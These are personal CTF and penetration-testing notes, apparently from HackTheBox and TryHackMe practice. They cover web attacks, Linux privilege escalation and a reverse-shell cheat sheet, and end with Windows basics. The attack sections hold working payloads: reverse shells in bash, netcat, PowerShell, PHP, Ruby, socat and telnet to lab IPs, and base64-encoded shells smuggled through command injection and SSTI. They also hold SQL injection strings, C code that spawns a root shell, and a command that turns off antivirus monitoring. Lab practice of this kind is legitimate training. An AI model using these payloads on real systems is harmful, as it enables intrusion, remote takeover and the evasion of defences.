*CTF Tips*
- 👨‍💻By: Nathan Hailu
- 🗒Description: A CTF tips collected while playing CTF
- 📅Date: Sun 10/25/2022
----
# Methodologies
## Machine CTF
- Nmap scan 
	- one -p-
	- one normal -vvv
- directory scan
	- dirb
	- dirsearch
		- if you dont have any way in may be it is because of the hidden file to get that increase ur threads to 60
	- feroxbuster
	- 
- subdomain scan
	- ffuf - seclists
## Web CTF
### A) File Inclusion / path traversal
    - IF the site have file opening method like => ...?home=about
      - TRY: home=`php://filter/convert.base64-encode/resource=index`
### B) IDOR


### C) SQL-injection
- If the database is **sqlite**
	- a' || (select sqlite_version()));--
	- a' || (select sql from sqlite_master));--
	- a' || (select password from xde43_users where role="admin"));--
- Try to inject on the **id** parameter
- When you get errors like "HY000 1 unrecognized token: "'" "
	- Try to use sqlmap  =>  sqlmap -u link --dump-all
### D) XSS
- Use <img\> tags rather than <script\> U can upload svg file (image) then do xss with svg files
### E) Broken Access Control
- **changing** role of 'user' to 'admin' will give u the flag!
### F) Obfuscation
- Some websites give you JS code for hint and they will **Obfuscate** it so to decode that use
      - This site:  https://lelinhtinh.github.io/de4js/ 
        - ON THIS the obfuscation looks js code but it is human unreadable form.
    - If you see []+[][[+]}]... kind of obfuscate it is **JSFUCK**.
    - Another Site: http://www.jsnice.org/ 

### G) File Upload
- If the Uploaded file path *is known*
	- http://example.com/data/shell.pdf
	- **it wont run the php code, so try**
	- => http://example.com/index.php?data/shell.pdf

### H) Host Headers
    - If the hint have language staff
      - change the accept-language to the hints.

### I) PHP secure code
- 
    
## Git CTF
- get the .git link
- download it with gitdumper.sh
	  `gitdumper.sh http://167.99.135.253/.git clone-folder`
- extract the main file with extractor.sh
	  `extractor.sh clone-folder pre`
- Go to the pre folder and check if there is flag or username,password
- to download all files of git recursively
	  `wget -r http://web.com/.git`
- if there is any commit
	  `git log`   =>   and look for something jucie throught the commit message
 - if there any copy the commit id and
	  `git show <id>`
- some CTF's will give u the source code and the encrypted flag on some place, and the decrypting function will be on the source code.
  - so edit the code(like replaceing the encrypt function to decrypt) and run it
		  `php index.php`
```bash
# Commands
git log
git show <>
git restore <>   ->  will restore deleted files
git status
```

# REMEMBERS
- Always when you get programs check for their version and find if there is any exploit for them
- For directory search
	- dirb
	- dirsearch
- On command Injection
	- for 1 liner you can use \${IFS} to replace the whitespace `kanderson;echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMTQvOTk5OSAwPiYxCg="|base64${IFS}-d|bash;
- extracting jar file
`jar tvf jarfile.jar
- On PGP key naming, the uid is in text with out <, > signs but it works fine with `{{7*7}}` huh SSTI😁
- if you see flash think about SSTI
	-`{{request.application.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMTQvNDAwMCAwPiYxCg==" | base64 -d | bash').read()}}`
- Latex Exploit
	- https://exploit-notes.hdks.org/exploit/web/security-risk/latex-injection/
- If you are on Apache server sensetive files can be stored in the following paths, so if u got reading permission/method read them
	- /var/www/dev/.htaccess
	- /var/www/html/.htaccess
	- /var/www/stats/.htaccess
	- .htaccess can be `.htpasswd`
## Priv - Esc
- Check files in /tmp , /opt
- linpeas
	- check env
	- os releases
	- suid bits
	- sudo 
- pspy64
- ---
### Linux Privileges Escallation
- 👤Nathan Hailu 
- 📅Sat 23 Apr 2022 06:52:26 AM EDT 
- 📍TryHackMe
#### Basic commands
 - to check if program exists 
	 - `which $yourprogram`
 - to give `sudo -l` access
	 - add the following in sudoers file udner #includedir
		- `username ALL=(ALL:ALL) /usr/bin/pico`
- To get Privilege escalating software commands
	- Linux: [GTFOBins](https://gtfobins.github.io/)
	- Windows: [LOLBAS](https://lolbas-project.github.io/#)
- If the System Have GCC installed Use
	- [[CTF Notes/CTF_notes/General Notes🤷‍♂️#2) LD-preload]]
	- [[CTF Notes/CTF_notes/General Notes🤷‍♂️#6) PATH exploiting]]
	- Check some Informations from emails
		- `/var/mail` 
--- 
#### 1) Kernel exploit

	-Find The kernel Version on ExploitDB if you got any exploits

#### 2) LD-preload

- LD_PRELOAD is a function that allows any program to use shared libraries
	- `sudo -l`  -> find text "env_keep+=LD_PRELOAD", if it exists....
	- Write a simple C code compiled as a share object (.so extension) file
```Cpp
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void \_init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}		 
```
	gcc -fPIC -shared -o shell.so shell.c -nostartfiles
	sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
#### 3) SUID vuln
`find / -type f -perm -04000 -ls 2>/dev/null`
- The programs listed in the result of the aboves program can excute any thing with out root for exploiting Commands Check [GFObins](https://gtfobins.github.io/) site under SUID vuln. 
#### 4) Capabilities
~ `getcap -r / 2>dev/null`
>[!info] he programs listed in the result of the aboves program can excute any thing with out root for exploiting Commands Check [GFObins] site under Capabilities. 
#### 5) Cron Jobs
-  `cat /etc/crontab`  -  Check this File content
	- programs listed with `" * * * * * root /home/$myprogram" ` inside it.
	- means will run myprogram with root access everysecond. so changing the content of my program to a reverse shell exploit will give as a access. 
- check the directory 
	- `/etc/cron.d`
	- `/var/spool/cron/crontabs/root`
	- some permissions might be sated niside some file there.

#### 6) PATH exploiting
- create a c program in your home, with name "path"
```C
#include<unistd.h>
void main()
{ setuid(0);
	setgid(0);
	system("somefile");
}
```
- `find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`    
	- -> Will give you foldernames that is writtable
- `export PATH=/yourfolder:$PATH`
- make a bash program in $yourfolder
	- `echo "/bin/bash" > somefile`
	- `chmod 777 somefile`
- run your 1st code "./path"
#### 7) NFS(Network File Sharing) server Exploit

~ `cat /etc/exports`  -> check if there is folder with"no_root_squash"
* `showmount -e $VictimIP` -> will show you folders "folderNFS"
* `mkdir /tmp/victimfiles`
* `mount -o rw $VictimIP:/folderNFS /tmp/victimfiles`
* Create a c script for reverse shell gaining
* compile it with gcc
*	give it permission(+s)
-  exeute the script from victim shell
#### 8) Vulnerable Software
- We can look for installed software with `dpkg -l` and if they have #public_exploit we will check.
#### 9) Sudo Privilege
- We can check what `sudo` privileges we have with the `sudo -l` command.
- There are certain occasions where we may be allowed to execute certain applications, or all applications, without having to provide a password
```shell
hnathan26@htb[/htb]$ sudo -l 
	(user : user) NOPASSWD: /bin/echo
```
- To run commands as another user
- `sudo -u user /bin/echo Hello World!`
#### 10) Exposed Credentials
- we can look for files we can read and see if they contain any exposed credentials. This is very common with `configuration` files, `log` files, and user history files (`bash_history` in Linux and `PSReadLine` in Windows). The enumeration scripts we discussed at the beginning usually look for potential passwords in files and provide them to us
- They can be found in
	- Database files
	- Php files
## Reverse Shells - commands
### bash Reverse Shell
	- `bash -i >& /dev/tcp/10.10.16.11/4444 0>&1`	  
	- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.11 4444 >/tmp/f`
### powershell Reverse Shell
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.66',4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```
- We Might get errors while doing this PS payload, error like
```powershell
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```
- For this we need to deactivate the AV, using the following command
	- `Set-MpPreference -DisableRealtimeMonitoring $true`
### PHP Reverse Shell

```
php -r '$sock=fsockopen("192.168.1.2",80);exec("/bin/sh -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("192.168.1.2",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

### Ruby Reverse Shell

`ruby -rsocket -e'f=TCPSocket.open("192.168.1.2",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`

### Bash TCP Reverse Shell

`bash -i >& /dev/tcp/192.168.1.2/4444 0>&1`

### Bash UDP Reverse Shell

`sh -i >& /dev/udp/192.168.1.2/5555 0>&1`

### Telnet Reverse Shell

```
telnet ATTACKING-IP 80 | /bin/bash | telnet 192.168.1.2 4444

rm -f /tmp/p; mknod /tmp/p p && telnet 192.168.1.2 4444 0/tmp/p
```

### Netcat Reverse Shell

```
nc -e /bin/sh 192.168.1.2 80

rm -f /tmp/p; mknod /tmp/p p && nc 192.168.1.2 4444 0/tmp/p
```

### Socat Reverse Shell

`socat tcp-connect:<IP>:<PORT> exec:"bash -li",pty,stderr,setsid,sigint,sane`

### Powershell Reverse Shell

```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.1.2",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
## Upgrading TTY 
- Using #pty
	- On VIctim
		- `python3 -c 'import pty; pty.spawn("/bin/bash")'` 
		- then make it to background process (ctrl + Z)
	- On Attacker
		- You can use the following
		 ```shell
hnathan26@htb[/htb]$ stty raw -echo
hnathan26@htb[/htb]$ fg

[Enter]
[Enter]
www-data@remotehost$
 ```
- We can get a problem on the reverse shell and out terminal size for this we can fix with
	- Checking our terminal
		- `echo $TERM` -> #tmux-256color
		- `stty size` -> <row\> <col\>
	- On the reverse shell
		- `export TERM=<YOURVALUE>`
		- `stty rows <row> columns <col>`
- we can place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`. This technique is usually used to gain ssh access after gaining a shell as that user
	- We Create Key `ssh-keygen`
	- we will copy our `.pub` to victims `.ssh` folder and we will use `-i` with our private key on our computer
## Spawning Interactive Shell
### Perl
```shell
perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh";
```
### Ruby
```shell
ruby: exec "/bin/sh"
```
### Lua
```shell
lua: os.execute('/bin/sh')
```
### Awk
```shell
awk 'BEGIN {system("/bin/sh")}'
```
### Find
```shell
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
find . -exec /bin/sh \;; -quit
```
### Vim
```shell
vim -c ':!/bin/sh'
```

## Hash Types

```
Base2	01100010 01110010 01100101 01100001 01101011 01101001 01110100
Base8	142 162 145 141 153 151 164
Base16	62 72 65 61 6b 69 74
Base32	MJZGKYLLNF2A====
Base58	4jP4KDubX1
Base62	22udqyscMu
Base64	YnJlYWtpdA==
Base85	@WH$gCM@k
Base91	%zmfv;:YH
```

# Windows Fundamental
- To find information about windows OS
```powershell
PS C:\htb> Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumber
```
	- select is like "grep"
- We can list out the NTFS permissions on a specific directory by running either `icacls`
```shell
C:\htb> icacls c:\windows
c:\windows NT SERVICE\TrustedInstaller:(F)
           NT SERVICE\TrustedInstaller:(CI)(IO)(F)
           NT AUTHORITY\SYSTEM:(M)
```
- `F` : full access
- `D` :  delete access
- `N` :  no access
- `M` :  modify access
- `RX` :  read and execute access
- `R` :  read-only access
- `W` :  write-only access

- CHMOD +rwx       on windows `icacls folderPATH /grant username:f`
- CHMOD -rwx       on windows `icacls c:\users /remove joe`
- On windows the command `net share` will display which share is available
## Services
- Windows services are managed via the Service Control Manager (SCM) system, accessible via the `services.msc` MMC add-in.
- To See Running Services
	- `Get-Service | ? {$_.Status -eq "Running"} | select -First 2 | fl`
- Windows has three categories of services: Local Services, Network Services, and System Services.

|Service|Description|
|---|---|
|smss.exe|Session Manager SubSystem. Responsible for handling sessions on the system.|
|csrss.exe|Client Server Runtime Process. The user-mode portion of the Windows subsystem.|
|wininit.exe|Starts the Wininit file .ini file that lists all of the changes to be made to Windows when the computer is restarted after installing a program.|
|logonui.exe|Used for facilitating user login into a PC|
|lsass.exe|The Local Security Authentication Server verifies the validity of user logons to a PC or server. It generates the process responsible for authenticating users for the Winlogon service.|
|services.exe|Manages the operation of starting and stopping services.|
|winlogon.exe|Responsible for handling the secure attention sequence, loading a user profile on logon, and locking the computer when a screensaver is running.|
|System|A background system process that runs the Windows kernel.|
|svchost.exe with RPCSS|Manages system services that run from dynamic-link libraries (files with the extension .dll) such as "Automatic Updates," "Windows Firewall," and "Plug and Play." Uses the Remote Procedure Call (RPC) Service (RPCSS).|
|svchost.exe with Dcom/PnP|Manages system services that run from dynamic-link libraries (files with the extension .dll) such as "Automatic Updates," "Windows Firewall," and "Plug and Play." Uses the Distributed Component Object Model (DCOM) and Plug and Play (PnP) services.|
- Examining Services with PS
	- `sc qc <ServiceName>`
	- To check service on network
		- `sc //<IP>`
	- To Start/stop Serice
		- `sc start <serivename>` can be `stop` too
	- sc would give us the ability to quickly search and analyze commonly targeted services and newly created services.
		- `sc sdshow <ServiceName>`
- examine service permissions by targeting the path of a specific service in the registry
	- `Get-ACL -Path HKLM:\System\CurrentControlSet\Services\wuauserv | Format-List`
- There are 3 types of non-interactive accounts: the `Local System Account`, `Local Service Account`, and the `Network Service Account`.

|Account|Description|
|---|---|
|Local System Account|Also known as the `NT AUTHORITY\SYSTEM` account, this is the most powerful account in Windows systems. It is used for a variety of OS-related tasks, such as starting Windows services. This account is more powerful than accounts in the local administrators group.|
|Local Service Account|Known as the `NT AUTHORITY\LocalService` account, this is a less privileged version of the SYSTEM account and has similar privileges to a local user account. It is granted limited functionality and can start some services.|
|Network Service Account|This is known as the `NT AUTHORITY\NetworkService` account and is similar to a standard domain user account. It has similar privileges to the Local Service Account on the local machine. It can establish authenticated sessions for certain network services.|
## PowerShell
- PowerShell utilizes [cmdlets](https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/cmdlet-overview?view=powershell-7), which are small single-function tools built into the shell. There are more than 100 core cmdlets, and many additional ones have been written, or we can author our own to perform more complex tasks
- Cmdlets are in the form of `Verb-Noun`. 
	- For example, 
		- `Get-ChildItem` - same as `ls`
			- `Get-ChildItem -Recurse`
			- `get-ChildItem -Path C:\` 
		- `Get-Alias` - to get the short form of the cmdlets
		- To Create Alias - `New-Alias -Name "Show-Files" Get-ChildItem`
		- 
- we will find that we are unable to run scripts on a system. This is due to a security feature called the `execution policy`
	- To see the Policy 
		- `Get-ExecutionPolicy -List`
	- A user can easily bypass the policy by either typing the script contents directly into the PowerShell window, downloading and invoking the script, or specifying the script as an encoded command.
	- can also be bypassed by adjusting the execution policy
		- `Set-ExecutionPolicy Bypass -Scope Process`
- Grep for windows  - `Where-Object { $_.DisplayName -eq "FoxitReaderUpdateService" }`
- To get info about user - `Get-WmiObject -Class Win32_UserAccount -Filter "Name='username'"`
- Info of Group - `Get-WmiObject -Class Win32_Group -Filter "Name='GroupName'"`
	- SID - `(SID)-(revision level)-(identifier-authority)-(subauthority1)-(subauthority2)-(etc)`
- To Create User - `New-LocalUser -Name "username"`
- Create Group - `New-LocalGroup -Name "HR" -Description "HR Department"`
	- Add user to group - `Add-LocalGroupMember -Group "HR" -Member "Jim"`
## Windows Management Instrumentation(WMI)
- Windows Management Instrumentation(WMI) is a subsystem of PowerShell that provides system administrators with powerful tools for system monitoring
- Some of the uses for WMI are:
	- Status information for local/remote systems
	- Configuring security settings on remote machines/applications
	- Setting and changing user and group permissions
	- Setting/modifying system properties
	- Code execution
	- Scheduling processes
	- Setting up logging
- To read computername - `wmic computersystem get name`
- Information about the OS - `wmic os list brief`
## Registry
- The [Registry](https://en.wikipedia.org/wiki/Windows_Registry) is a hierarchical database in Windows critical for the operating system.
- divided into computer-specific and user-specific data
- The tree-structure consists of main folders (root keys) in which subfolders (subkeys) with their entries/files (values) are located. There are 11 different types of values that can be entered in a subkey.
	- ![[Pasted image 20231123105821.png]]
	- Each folder under `Computer` is a key.
	- The root keys all start with `HKEY`.
		- A key such as `HKEY-LOCAL-MACHINE` is abbreviated to `HKLM`
			- HKLM contains all settings that are relevant to the local system.
			- contains six subkeys like `SAM`, `SECURITY`, `SYSTEM`, `SOFTWARE`, `HARDWARE`, and `BCD`
		- system registry is stored in several files on the operating system. You can find these under `C:\Windows\System32\Config\`
		- user-specific registry hive (HKCU) is stored in the user folder (i.e., `C:\Users\<USERNAME>\Ntuser.dat`). 
### Run and RunOnce Registry Keys
- registry hives, which contain a logical group of keys, subkeys, and values to support software and files loaded into memory when the operating system is started or a user logs in, These hives are called run/runonce registry keys
- The Windows registry includes the following four keys:
```powershell
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
```
8
```powershell
PS C:\htb> reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    OneDrive    REG_SZ    "C:\Users\bob\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
    OPENVPN-GUI    REG_SZ    C:\Program Files\OpenVPN\bin\openvpn-gui.exe
    Docker Desktop    REG_SZ    C:\Program Files\Docker\Docker\Docker Desktop.ex
```